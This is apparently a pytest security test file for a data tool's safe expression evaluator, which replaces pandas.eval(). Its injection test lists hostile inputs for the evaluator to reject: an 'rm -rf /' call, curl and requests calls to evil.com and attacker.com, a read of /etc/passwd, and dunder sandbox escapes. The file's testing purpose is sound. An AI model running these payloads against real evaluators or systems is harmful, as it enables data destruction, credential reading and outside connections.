"""Security tests for expression evaluation.

This module contains comprehensive security tests to ensure that the secure
expression evaluator properly blocks code injection attempts while allowing
legitimate mathematical expressions.

Author: DataBeak Security Team
Issue: #46 - Address pandas.eval() code injection vulnerability
"""

import math

import numpy as np
import pandas as pd
import pytest

from src.databeak.exceptions import InvalidParameterError
from src.databeak.models.expression_models import SecureExpression
from src.databeak.utils.secure_evaluator import (
    SecureExpressionEvaluator,
    validate_expression_safety,
)


class TestExpressionSecurity:
    """Test security aspects of expression evaluation."""

    def setup_method(self):
        """Set up test data for each test method."""
        self.evaluator = SecureExpressionEvaluator()
        self.test_df = pd.DataFrame(
            {
                "col1": [1, 2, 3, 4, 5],
                "col2": [10, 20, 30, 40, 50],
                "col3": [1.1, 2.2, 3.3, 4.4, 5.5],
                "negative_col": [-1, -2, -3, -4, -5],
                "zero_col": [0, 0, 1, 0, 2],
            }
        )

    def test_code_injection_blocked(self):
        """Test that various code injection attempts are blocked."""
        malicious_expressions = [
            # System access attempts
            "__import__('os').system('rm -rf /')",
            "__import__('subprocess').run(['curl', 'evil.com'])",
            "__import__('requests').get('http://attacker.com')",
            # Code execution attempts
            "exec('print(\"hacked\")')",
            "eval('malicious_code')",
            "compile('bad_code', '<string>', 'exec')",
            # File system access
            "open('/etc/passwd').read()",
            "open('secrets.txt', 'w').write('stolen')",
            # Attribute access attacks
            "globals()['__builtins__']['exec']('code')",
            "locals()['hidden_var']",
            "__builtins__.__dict__['eval']('code')",
            "getattr(__builtins__, 'exec')('code')",
            # Import attacks
            "import os; os.system('bad')",
            "from os import system; system('bad')",
            # Dunder method attacks
            "''.__class__.__mro__[2].__subclasses__()[104]",
            "[].__class__.__base__.__subclasses__()",
            # Function definition attacks
            "lambda: exec('code')",
            "def hack(): exec('code')",
            # Module access
            "sys.exit()",
            "os.environ['PATH']",
        ]

        for malicious_expr in malicious_expressions:
            with pytest.raises(InvalidParameterError) as exc_info:
                validate_expression_safety(malicious_expr)

            # Verify the error message indicates security concern
            error_msg = str(exc_info.value).lower()
            assert any(
                keyword in error_msg
                for keyword in ["dangerous", "unsafe", "not allowed", "invalid"]
            ), f"Security error not properly indicated for: {malicious_expr}"

    def test_safe_mathematical_expressions_allowed(self):
        """Test that legitimate mathematical expressions work correctly."""
        safe_expressions_and_expected = [
            # Basic arithmetic
            ("col1 + col2", [11, 22, 33, 44, 55]),
            ("col1 * 2", [2, 4, 6, 8, 10]),
            ("col1 - col2", [-9, -18, -27, -36, -45]),
            ("col2 / col1", [10.0, 10.0, 10.0, 10.0, 10.0]),
            # Mathematical functions
            ("abs(negative_col)", [1, 2, 3, 4, 5]),
            ("max(col1, col2)", [10, 20, 30, 40, 50]),
            ("min(col1, col2)", [1, 2, 3, 4, 5]),
            ("round(col3, 1)", [1.1, 2.2, 3.3, 4.4, 5.5]),
            # Complex expressions
            ("(col1 + col2) / 2", [5.5, 11.0, 16.5, 22.0, 27.5]),
            ("sqrt(col1 * col1 + col2 * col2)", None),  # Will calculate dynamically
            # Numpy functions
            ("np.abs(negative_col)", [1, 2, 3, 4, 5]),
            ("np.maximum(col1, 3)", [3, 3, 3, 4, 5]),
            ("np.sqrt(col1)", None),  # Will calculate dynamically
        ]

        for expr, expected in safe_expressions_and_expected:
            try:
                result = self.evaluator.evaluate_column_expression(expr, self.test_df)
                assert isinstance(result, pd.Series), f"Result should be Series for: {expr}"
                assert len(result) == len(self.test_df), f"Result length mismatch for: {expr}"

                if expected is not None:
                    np.testing.assert_array_almost_equal(
                        result.values, expected, err_msg=f"Unexpected result for: {expr}"
                    )

            except Exception as e:
                pytest.fail(f"Safe expression failed: {expr} - Error: {e}")

    def test_column_reference_validation(self):
        """Test that column references are properly validated."""
        # Valid column references (backticks are handled internally, not in user expressions)
        valid_expressions = [
            "col1 + col2",
            "col1 + col2 + col3",
        ]

        for expr in valid_expressions:
            result = self.evaluator.evaluate_column_expression(expr, self.test_df)
            assert isinstance(result, pd.Series)

        # Invalid column references
        with pytest.raises(InvalidParameterError):
            self.evaluator.evaluate_column_expression("nonexistent_col + 1", self.test_df)

    def test_pydantic_model_validation(self):
        """Test that Pydantic models properly validate expressions."""
        # Valid expressions should work
        valid_expr = SecureExpression(expression="col1 + col2")
        assert valid_expr.expression == "col1 + col2"

        # Invalid expressions should be rejected
        with pytest.raises(ValueError):
            SecureExpression(expression="exec('malicious')")

        with pytest.raises(ValueError):
            SecureExpression(expression="__import__('os').system('bad')")

    def test_apply_expression_model(self):
        """Test apply operation with unified SecureExpression."""
        apply_expr = SecureExpression.apply_operation("x * 2")

        # Test column substitution
        substituted = apply_expr.get_expression_with_column("my_column")
        assert "`my_column`" in substituted

        # Test evaluation
        result = self.evaluator.evaluate_column_expression(
            substituted.replace("`my_column`", "col1"), self.test_df
        )
        expected = [2, 4, 6, 8, 10]
        np.testing.assert_array_equal(result.values, expected)

    def test_function_allowlist_enforcement(self):
        """Test that only allowlisted functions can be used."""
        # Allowed functions should work
        allowed_functions = [
            "abs(col1)",
            "max(col1, col2)",
            "sqrt(col1)",
            "np.sin(col1)",
            "round(col3, 2)",
        ]

        for expr in allowed_functions:
            try:
                result = self.evaluator.evaluate_column_expression(expr, self.test_df)
                assert isinstance(result, pd.Series)
            except Exception as e:
                pytest.fail(f"Allowed function failed: {expr} - Error: {e}")

        # Disallowed functions should be blocked
        disallowed_functions = [
            "print(col1)",
            "input('Enter value')",
            "help(col1)",
            "type(col1)",
            "id(col1)",
            "hash(col1)",
        ]

        for expr in disallowed_functions:
            with pytest.raises(InvalidParameterError):
                validate_expression_safety(expr)

    def test_performance_vs_pandas_eval(self):
        """Test that secure evaluator performance is reasonable."""
        import time

        # Create larger test data
        large_df = pd.DataFrame(
            {
                "col1": range(10000),
                "col2": range(10000, 20000),
            }
        )

        # Test expression
        expr = "col1 * 2 + col2 / 3"

        # Measure secure evaluator time
        start_time = time.time()
        secure_result = self.evaluator.evaluate_column_expression(expr, large_df)
        secure_time = time.time() - start_time

        # Measure pandas eval time (for comparison only - don't use in production!)
        start_time = time.time()
        pandas_result = large_df.eval(expr)
        pandas_time = time.time() - start_time

        # Results should be equivalent - ensure both are Series
        assert isinstance(pandas_result, pd.Series), "pandas_result should be a Series"
        pd.testing.assert_series_equal(
            secure_result.sort_index(), pandas_result.sort_index(), check_names=False
        )

        # Performance should be reasonable (within 10x of pandas.eval)
        performance_ratio = secure_time / pandas_time if pandas_time > 0 else 1
        assert performance_ratio < 10, f"Performance ratio too high: {performance_ratio:.2f}x"

    def test_edge_cases(self):
        """Test edge cases and error conditions."""
        # Empty expression
        with pytest.raises(InvalidParameterError):
            validate_expression_safety("")

        # None expression
        with pytest.raises(InvalidParameterError):
            validate_expression_safety(None)

        # Very long expression (should be blocked by Pydantic)
        long_expr = "col1 + " * 1000 + "col2"
        with pytest.raises(ValueError):
            SecureExpression(expression=long_expr)

        # Division by zero handling (should produce inf, not raise error)
        df_with_zero = pd.DataFrame({"col1": [1, 0], "col2": [1, 1]})
        result = self.evaluator.evaluate_column_expression("col2 / col1", df_with_zero)
        assert result[0] == 1.0  # 1/1 = 1
        assert np.isinf(result[1])  # 1/0 = inf

    def test_numpy_integration(self):
        """Test that numpy functions work correctly."""
        numpy_expressions = [
            ("np.abs(negative_col)", [1, 2, 3, 4, 5]),
            ("np.sqrt(col1)", [1.0, math.sqrt(2), math.sqrt(3), 2.0, math.sqrt(5)]),
            ("np.maximum(col1, 3)", [3, 3, 3, 4, 5]),
            ("np.sin(zero_col)", [0, 0, math.sin(1), 0, math.sin(2)]),
        ]

        for expr, expected in numpy_expressions:
            result = self.evaluator.evaluate_column_expression(expr, self.test_df)
            np.testing.assert_array_almost_equal(result.values, expected)

    def test_constant_access(self):
        """Test that mathematical constants are accessible."""
        constant_expressions = [
            ("col1 + pi", [i + math.pi for i in range(1, 6)]),
            ("col1 * e", [i * math.e for i in range(1, 6)]),
            ("np.pi * col1", [i * np.pi for i in range(1, 6)]),
        ]

        for expr, expected in constant_expressions:
            result = self.evaluator.evaluate_column_expression(expr, self.test_df)
            np.testing.assert_array_almost_equal(result.values, expected)

    def test_supported_functions_list(self):
        """Test that the supported functions list is comprehensive."""
        supported = self.evaluator.get_supported_functions()

        # Should include basic math functions
        required_functions = ["abs", "max", "min", "sqrt", "sin", "cos", "np.abs", "np.sqrt"]
        for func in required_functions:
            assert func in supported, f"Required function {func} not in supported list"

        # Should not include dangerous functions
        dangerous_functions = ["exec", "eval", "open", "import", "__import__"]
        for func in dangerous_functions:
            assert func not in supported, f"Dangerous function {func} should not be supported"


class TestUnifiedExpression:
    """Test unified SecureExpression functionality."""

    def test_formula_creation(self):
        """Test creating formulas with unified SecureExpression."""
        formula = SecureExpression.formula("col1 + col2", "Sum of two columns")
        assert str(formula) == "col1 + col2"
        assert formula.description == "Sum of two columns"

    def test_apply_operation_creation(self):
        """Test creating apply operations with unified SecureExpression."""
        apply_expr = SecureExpression.apply_operation("x * 2 + 1")
        assert str(apply_expr) == "x * 2 + 1"
        assert apply_expr.variable_name == "x"

    def test_condition_creation(self):
        """Test creating conditional expressions with unified SecureExpression."""
        condition = SecureExpression.condition("col1 > 0", "Positive values")
        assert str(condition) == "col1 > 0"
        assert condition.description == "Positive values"

    def test_invalid_expressions_blocked(self):
        """Test that invalid expressions are blocked in all creation methods."""
        with pytest.raises(ValueError):
            SecureExpression.formula("exec('bad')")

        with pytest.raises(ValueError):
            SecureExpression.apply_operation("exec('bad')")

        with pytest.raises(ValueError):
            SecureExpression.condition("exec('bad')")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
